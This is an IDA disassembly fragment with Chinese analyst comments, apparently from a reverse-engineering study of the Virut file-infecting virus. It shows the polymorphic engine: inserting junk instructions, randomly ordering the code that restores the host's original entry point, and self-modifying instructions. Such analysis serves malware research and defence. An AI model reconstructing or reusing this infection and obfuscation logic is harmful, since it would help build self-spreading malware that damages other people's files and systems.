
```asm
.remote:001B3D12 01C 72 79                             jb      short loc\_1B3D8D

.remote:001B3D14 01C 80 BD 10 55 1B 00+                cmp     ss:flag\_find\_import[ebp], 2 ; 是否找到导入kernel的函数

.remote:001B3D1B 01C 73 70                             jnb     short loc\_1B3D8D

.remote:001B3D1D 01C 80 BD 10 55 1B 00+                cmp     ss:flag\_find\_import[ebp], 0 ; 是否找到导入kernel的函数

.remote:001B3D24 01C 75 06                             jnz     short loc\_1B3D2C

.remote:001B3D26 01C 89 BD 12 55 1B 00                 mov     ss:ret\_to\_host\_address[ebp], edi

.remote:001B3D2C

.remote:001B3D2C                       loc\_1B3D2C:                             ; CODE XREF: sub\_1B37FD+527j

.remote:001B3D2C 01C 0F B6 85 11 55 1B+                movzx   eax, ss:rand\_flag[ebp] ; 决定恢复OEP的两条指令  顺序

.remote:001B3D33 01C 6A 07                             push    7

.remote:001B3D35 020 6B C0 03                          imul    eax, 3

.remote:001B3D38 020 59                                pop     ecx

.remote:001B3D39 01C 8B 95 FE 54 1B 00                 mov     edx, ss:old\_entrypoint[ebp]

.remote:001B3D3F 01C 80 BD 10 55 1B 00+                cmp     ss:flag\_find\_import[ebp], 1 ; 是否找到导入kernel的函数

.remote:001B3D46 01C 75 05                             jnz     short loc\_1B3D4D

.remote:001B3D48 01C 83 C2 04                          add     edx, 4

.remote:001B3D4B 01C 2B D0                             sub     edx, eax

.remote:001B3D4D

.remote:001B3D4D                       loc\_1B3D4D:                             ; CODE XREF: sub\_1B37FD+549j

.remote:001B3D4D 01C 03 C8                             add     ecx, eax

.remote:001B3D4F 01C B0 C6                             mov     al, 0C6h

.remote:001B3D51 01C 02 85 11 55 1B 00                 add     al, ss:rand\_flag[ebp] ; 决定恢复OEP的两条指令  顺序

.remote:001B3D57 01C AA                                stosb

.remote:001B3D58 01C B0 05                             mov     al, 5

.remote:001B3D5A 01C AA                                stosb

.remote:001B3D5B 01C 8B C2                             mov     eax, edx

.remote:001B3D5D 01C 03 43 34                          add     eax, [ebx+34h]

.remote:001B3D60 01C AB                                stosd

.remote:001B3D61 01C 03 95 E6 54 1B 00                 add     edx, ss:entrypoint\_offset\_sub\_rva[ebp]

.remote:001B3D67 01C 03 95 86 54 1B 00                 add     edx, ss:lpFileBase[ebp]

.remote:001B3D6D 01C 8B 02                             mov     eax, [edx]

.remote:001B3D6F 01C 80 BD 11 55 1B 00+                cmp     ss:rand\_flag[ebp], 0 ; 决定恢复OEP的两条指令  顺序

.remote:001B3D76 01C 75 03                             jnz     short loc\_1B3D7B

.remote:001B3D78 01C AA                                stosb

.remote:001B3D79 01C EB 01                             jmp     short loc\_1B3D7C

.remote:001B3D7B                       ; ---------------------------------------------------------------------------

.remote:001B3D7B

.remote:001B3D7B                       loc\_1B3D7B:                             ; CODE XREF: sub\_1B37FD+579j

.remote:001B3D7B 01C AB                                stosd

.remote:001B3D7C

.remote:001B3D7C                       loc\_1B3D7C:                             ; CODE XREF: sub\_1B37FD+57Cj

.remote:001B3D7C 01C FE 85 10 55 1B 00                 inc     ss:flag\_find\_import[ebp] ; 是否找到导入kernel的函数

.remote:001B3D82 01C 80 B5 11 55 1B 00+                xor     ss:rand\_flag[ebp], 1 ; 决定恢复OEP的两条指令  顺序

.remote:001B3D89 01C EB 2A                             jmp     short loc\_1B3DB5 ; 修改指令为bts

.remote:001B3D89                       ; END OF FUNCTION CHUNK FOR sub\_1B37FD

.remote:001B3D8B                       ; ---------------------------------------------------------------------------

.remote:001B3D8B EB 05                                 jmp     short loc\_1B3D92

.remote:001B3D8D                       ; ---------------------------------------------------------------------------

.remote:001B3D8D                       ; START OF FUNCTION CHUNK FOR sub\_1B37FD

.remote:001B3D8D

.remote:001B3D8D                       loc\_1B3D8D:                             ; CODE XREF: sub\_1B37FD+508j

.remote:001B3D8D                                                               ; sub\_1B37FD+515j ...

.remote:001B3D8D 01C E8 82 0E 00 00                    call    get\_instruction\_length

.remote:001B3D92

.remote:001B3D92                       loc\_1B3D92:                             ; CODE XREF: sub\_1B37FD+46Bj

.remote:001B3D92                                                               ; sub\_1B37FD+47Aj ...

.remote:001B3D92 01C C6 85 E1 3D 1B 00+                mov     byte ptr ss:(loc\_1B3DE0+1)[ebp], 0B3h

.remote:001B3D99 01C 51                                push    ecx

.remote:001B3D9A 020 29 4C 24 08                       sub     [esp+20h+var\_18], ecx

.remote:001B3D9E 020 F3 A4                             rep movsb

.remote:001B3DA0 020 59                                pop     ecx

.remote:001B3DA1 01C EB 19                             jmp     short loc\_1B3DBC

.remote:001B3DA3                       ; ---------------------------------------------------------------------------

.remote:001B3DA3

.remote:001B3DA3                       loc\_1B3DA3:                             ; CODE XREF: sub\_1B37FD+454j

.remote:001B3DA3 01C 57                                push    edi

.remote:001B3DA4 020 F7 1C 24                          neg     [esp+20h+var\_20]

.remote:001B3DA7 020 E8 4A F4 FF FF                    call    get\_rabish

.remote:001B3DAC 020 59                                pop     ecx

.remote:001B3DAD 01C 03 CF                             add     ecx, edi

.remote:001B3DAF 01C 29 8D D2 54 1B 00                 sub     ss:number\_rablish[ebp], ecx ; 花指令总数减少

.remote:001B3DB5

.remote:001B3DB5                       loc\_1B3DB5:                             ; CODE XREF: sub\_1B37FD+4F9j

.remote:001B3DB5                                                               ; sub\_1B37FD+58Cj

.remote:001B3DB5 01C C6 85 E1 3D 1B 00+                mov     byte ptr ss:(loc\_1B3DE0+1)[ebp], 0ABh ; 修改指令为bts

.remote:001B3DBC

.remote:001B3DBC                       loc\_1B3DBC:                             ; CODE XREF: sub\_1B37FD+5A4j

.remote:001B3DBC 01C 8B 04 24                          mov     eax, [esp+1Ch+var\_1C]

.remote:001B3DBF 01C 66 01 8C C5 2A 17+                add     ss:block.n\_NumberOfOpcode[ebp+eax\*8], cx ; 变形后的OPCODE数增加

.remote:001B3DC7 01C 8D 57 FF                          lea     edx, [edi-1]

.remote:001B3DCA 01C E3 1E                             jecxz   short loc\_1B3DEA

.remote:001B3DCC 01C 2B 95 CE 54 1B 00                 sub     edx, ss:virut\_start\_in\_file\_off[ebp]

.remote:001B3DD2 01C 3B 95 20 1B 1B 00                 cmp     edx, ss:new\_body\_offset[ebp] ; 变形后的body在virut中的偏移

.remote:001B3DD8 01C 76 06                             jbe     short loc\_1B3DE0

.remote:001B3DDA 01C 81 EA 34 3D 00 00                 sub     edx, 3D34h      ; 3d34 body的大小

.remote:001B3DE0

.remote:001B3DE0                       loc\_1B3DE0:                             ; CODE XREF: sub\_1B37FD+5DBj

.remote:001B3DE0                                                               ; sub\_1B37FD+5EBj

.remote:001B3DE0                                                               ; DATA XREF: ...

.remote:001B3DE0 01C 0F B3 95 44 1A 1B+                btr     ss:is\_rabish[ebp], edx ;  位测试为1的则是垃圾指令

.remote:001B3DE7 01C 4A                                dec     edx

.remote:001B3DE8 01C E2 F6                             loop    loc\_1B3DE0

.remote:001B3DEA

.remote:001B3DEA                       loc\_1B3DEA:                             ; CODE XREF: sub\_1B37FD+5CDj

.remote:001B3DEA 01C 58                                pop     eax

.remote:001B3DEB 018 59                                pop     ecx

.remote:001B3DEC 014 E9 4D FE FF FF                    jmp     loc\_1B3C3E
```
